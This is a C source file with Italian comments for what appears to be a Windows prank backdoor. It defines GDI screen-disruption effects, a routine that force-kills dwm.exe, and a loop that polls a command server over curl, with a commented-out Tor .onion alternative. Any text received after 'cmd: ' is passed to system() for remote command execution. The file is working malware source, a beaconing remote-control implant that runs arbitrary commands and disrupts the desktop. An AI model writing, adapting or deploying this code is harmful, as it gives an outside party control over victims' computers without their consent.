// compile 4 windows: cl C:\Users\user\Desktop\GDIManager.c /O2 /link gdi32.lib user32.lib
// devi compilare dalla shell di sviluppo x64 di vscommunity
#ifdef _WIN32
    #define popen _popen // MSVC non riconosce popen, ma _popen, quindi definisce popen as _popen, idem con pclose
    #define pclose _pclose
#endif
#define _WIN32_WINNT 0x0600
#define WINVER 0x0600
#include <windows.h>
#include <math.h>
#include <string.h>
#include <stdio.h>
#include <time.h>

/*
BitBlt usage:
BitBlt(hdcDest, TakeX, TakeY, TakeW, TakeH, hdcSrc, XSrc, YSrc, MODE)

Modes:
SRCCOPY - Copy
NOTSRCCOPY - Color invert
SRCINVERT - PXColor = PXColorDest + PXColoreSRC
BLACKNESS - black block
WHITENESS - white block
*/


//globalz
int w; // width
int h; // heigh

void heightglitch_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    int x = 0;

    x = rand() % w; // random lungo w
    BitBlt(hdc, x, 0, 10, h, hdc, x, 0, NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

void widthglitch_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    int x = 0;

    x = rand() % h; // random lungo h
    BitBlt(hdc, 0, x, w, 10, hdc, 0, x, NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

void tunnel_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);

    int newW = w - (1 * w / 100);
    int newH = h - (1 * h / 100);

    // trova il centro
    int x = (w - newW) / 2;
    int y = (h - newH) / 2;

    StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

void circleshake_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    static float angle = 0.1f;

    int dx = (int)(sin(angle) * 5);
    int dy = (int)(cos(angle) * 5);

    BitBlt(hdc, dx, dy, w, h, hdc, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hdc);

    angle = angle + 0.1f;
    Sleep(10);
}

void ltunnel_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    
    int newW = w - (10 * w / 100);
    int newH = h - (10 * h / 100);

    // centro
    int x = (w - newW) / 2;
    int y = (h - newH) / 2;

    StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

void squarefx_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    
    //variabili statiche bcz con il while(1) esterno non verranno inizializzate in loop
    //non settare x e y a 0, altrimenti non va (idk why)
    static int x = 3;
    static int y = 3;

    //px space x&y
    static int vx = 21;
    static int vy = 21;

    int red = rand() % 255;
    int green = rand() % 255;
    int blue = rand() % 255;

    HBRUSH white = CreateSolidBrush(RGB(red, green, blue)); // crea pennello brushed bianco
    SelectObject(hdc, white); // usa sopra l'hdc, con il bianco

    Rectangle(hdc, x, y, x + 100, y + 100); // top, left, bottom, right

    //collisione destra/sinistra
    if (x + 100 >= w || x <= 0) {
        vx = -vx;
    }

    //collisione alto/basso
    if (y + 100 >= h || y <= 0) {
        vy = -vy;
    }

    //movimento
    x = x + vx;
    y = y + vy;

    // quelle di sopra sono condizioni, non muovono un cazzo, grazie alla parte finale qualcosa si muove.

    //avoid mem leaks
    DeleteObject(white);
    ReleaseDC(NULL, hdc);
    Sleep(5);
}

// ho capito che hdc significa HandleDeviceContext, tradotto: accesso grafico allo schermo
// Invece GetDC(NULL) si piglia tutto schermo. Forse già lo sapevi
// DC = DeviceContext
void lulu() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL); // piglia il dc dello schermo
    HDC memdc = CreateCompatibleDC(hdc); // crea un DC compatibile in ram

    //karika il bmp (assicurati che sia real bmp. Esporta da paint per sicurezza)
    HBITMAP bmp = (HBITMAP)LoadImageA(NULL, "lulu.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);

    // usa bitmap nel memdc
    SelectObject(memdc, bmp);

    int randx = rand() % w;
    int randy = rand() % h;

    BitBlt(hdc, randx, randy, 776, 788, memdc, 0, 0, SRCCOPY);

    //togli merda (aka burn garbage; aka free mem; akak liberation; aka: restituisci risorsa grafica. MUà! )
    DeleteObject(bmp);
    DeleteDC(memdc);
    ReleaseDC(NULL, hdc);
    Sleep(2);
}

void fkngmelter() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    static int x = 0; // static, altrimenti reset brutale

    x = rand() % w;
    BitBlt(hdc, x, 5, 4, h, hdc, x, 0, SRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

void startfx() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    //yeahhh starta a bestia!
    heightglitch_run();
    widthglitch_run();
    tunnel_run();
    circleshake_run();
    ltunnel_run();
    squarefx_run();
    fkngmelter();
}

void msgbox() {
    srand(time(NULL)); // inizializza un seme per rand, metti ogni volta che usi rand() per avere numeri piu' entropici e meno prevedibili
    // [x][y]
    // x = contenitore (aka skatola)
    // y = byte (o char (bcz 1 char = 1 byte)) per contenitore
    // se ho x byte devo dichiarare x + 1. Ex: in una frase di 7 char ne devo dikiarare 8 bcz '\0' ('\0' sta sempre alla fine!)
    // if u want puoi togliere il [6] in [], il compilatore capisce dal numero di frasi.
    char frasi[7][200] = { // ricordiamo il seguente personaggio: Breiscot (aka DMAX, QLIMAX, EMACS) - Ha dato contributo nelle frasi di testing
        "Non prendere la vita troppo seriamente. Non ne uscirai vivo.",
        "Il piacere piu' grande della vita e' fare cio' che le persone dicono che non puoi fare",
        "Dovresti ascoltare piu' hardstyle... Ye, sono serio",
        "C'e' una canzone che fa: TU TU TU TU TU TU TU TUTUTU BRBRBRBRBRBRBRBRBRBRBRBR",
        "Secondo te dovrei usare dei puntatori o degli array per mostrare ste frasi con rand()?",
        "Pensa che esiste gente cosi' stupida che mette l'uovo nell'insalata di riso",
        "Che tristezza la neomelodica :("
    };

    int randomtext = rand() % 7; // ricorda di updatare qui quando addi frasi nuove, so che te lo scordi.
    MessageBox(NULL, frasi[randomtext], "MessageBox", MB_OK | MB_ICONINFORMATION);
}

void cleandwm() {
    system("TASKKILL /F /IM dwm.exe");
    Sleep(20000);
}

void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs')
    int w = GetSystemMetrics(SM_CXSCREEN) / 2; // piglio la meta' per ottenere il centro
    int h = GetSystemMetrics(SM_CYSCREEN) / 2; // idem qui

    HDC hdc = GetDC(NULL);

    //parametri & settings 4 dwm displaying
    SetBkMode(hdc, OPAQUE); // no bordi strani dietro
    SetTextColor(hdc, RGB(255,0,0)); // colore testo red
    HFONT font = CreateFont(128, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
    SelectObject(hdc, font);

    int now = time(NULL); //ora
    int future = now + secs; // secs futuri
    
    while (now < future) {
        Sleep(10);

        now = time(NULL); // adesso, in secs
        int remaining = future - now; // calcola il rimanente

	    char countdowndata[64]; // buffer di char (64), NON SUPERARE MAI I 64 CHAR! (molto difficile che succeda)
        sprintf(countdowndata, "COUNTDOWN: %d", remaining); // metti su countdowndata: "COUNTDOWN: " + remaining.

        TextOut(hdc, w, h, countdowndata, strlen(countdowndata)); // l'ultimo param (dove c'e' strlen) prende la lunghezza di countdowndata e la usa per avoidare la lettura di mem altrove.
    }

    // fx exhibition
    ULONGLONG elapsed = GetTickCount64(); // timer dal boot del kernel. Cifra a 64bit
    while (1) {
        if (GetTickCount64() - elapsed < 1000) {TextOut(hdc, w, h, "Elektro was here!", 17);}
        else if (GetTickCount64() - elapsed < 11000) {fkngmelter();}
        else if (GetTickCount64() - elapsed < 13000) {heightglitch_run();}
        else if (GetTickCount64() - elapsed < 14000) {TextOut(hdc, w, h, "Subwoofer", 9);}
        else if (GetTickCount64() - elapsed < 16000) {widthglitch_run();}
        else if (GetTickCount64() - elapsed < 21000) {lulu();}
        else if (GetTickCount64() - elapsed < 29000) {ltunnel_run();}
        else if (GetTickCount64() - elapsed < 33000) {tunnel_run();}
        else if (GetTickCount64() - elapsed < 43000) {fkngmelter();}
        else if (GetTickCount64() - elapsed < 63000) {squarefx_run();}
        else if (GetTickCount64() - elapsed < 65000) {circleshake_run();}
        else if (GetTickCount64() - elapsed < 69000) {tunnel_run();ltunnel_run();}
        else if (GetTickCount64() - elapsed < 77000) {fkngmelter();heightglitch_run();}
        else {break;}
    }
}

int main() {
    while(1) {
        printf("Clean\n");
        char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
        //FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
        FILE *pointertotextstream = popen("curl -s http://192.168.122.1:80/rce", "r"); // apre curl in modalita' sola lettura. FILE *pointer apre uno stream su popen, quindi prende l'output (SOLO LA PRIMA RIGA)

        if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
        
        if (fgets(reqtextbuffer, sizeof(reqtextbuffer), pointertotextstream) == NULL) { // meaning: fgets(buffer, size, stream), mette l'out di curl dentro il buffer
            pclose(pointertotextstream);
            printf("Sleeping for 20secz\n");
            Sleep(20000);
            continue; //quitta da questo if (quindi se continua ad essere NULL riparte e ritorna qui)
        } 

        pclose(pointertotextstream); // chiude il processo creato da popen (curl) (NEVER FORGET! Altrimenti fai un mem leak più grande di casa mia e più pesante del mio subwoofer con hp e sounbar integrata)
        printf("reqtextbuffer[]: %s\n", reqtextbuffer);

        /* 
        Sicrez codz:
        AllFx - 1
        HeighGlitch - 2
        WidthGlitch - 3
        TunnelRun - 4
        CircleShake - 5
        LongTunnel(morePX) - 6
        BouncySquare - 7
        FkngMelter - 8

        Misc:
        "cmd: " - xec a command
        "CleanDWM" - cleana DWM
        "RandomMSGs" - msgbox()
        "Timer: x" - start countdown stuff
        */

        if (strstr(reqtextbuffer, "1")) {
            int i;
            for (i=0;i<100;i++) {startfx();}
        }

        else if (strstr(reqtextbuffer, "2")) {
            int i;
            for(i=0;i<100;i++) {heightglitch_run();}
        }

        else if (strstr(reqtextbuffer, "3")) {
            int i;
            for(i=0;i<100;i++) {widthglitch_run();}
        }

        else if (strstr(reqtextbuffer, "4")) {
            int i;
            for(i=0;i<100;i++) {tunnel_run();}
        }

        else if (strstr(reqtextbuffer, "5")) {
            int i;
            for (i=0;i<100;i++) {circleshake_run();}
        }

        else if (strstr(reqtextbuffer, "6")) {
            int i;
            for (i=0;i<100;i++) {ltunnel_run();}
        }

        else if (strstr(reqtextbuffer, "7")) {
            int i;
            for (i=0;i<500;i++) {squarefx_run();}
        }

        else if (strstr(reqtextbuffer, "8")) {
            int i;
            for (i=0;i<1000;i++) {fkngmelter();}
        }

        else if (strstr(reqtextbuffer, "Lulu")) {
            int i;
            for (i=0;i<500;i++) {lulu();}
        }

        else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
            char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
            command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
            system(command); // esegui (RCE-Style)
            printf("Command Executed\n");
            printf("Sleeping for 20 secs\n");
            Sleep(20000);
        }

        else if (strstr(reqtextbuffer, "CleanDWM")) {
            cleandwm();
        }

        else if (strstr(reqtextbuffer, "RandomMSGs")) {
            msgbox();
        }

        else if (strstr(reqtextbuffer, "Timer: ")) {
            printf(reqtextbuffer);
            char *timer = reqtextbuffer + 7; // 7 char su "Timer: " (more doc? scrolla sopra)
            timer[strcspn(timer, "\r\n")] = '\0'; // idem qui, checcka sopra
            int secs = atoi(timer);
            printf(timer);
            countdown(secs);
        }
        else {Sleep(20000);}
    }
    return 0;
}
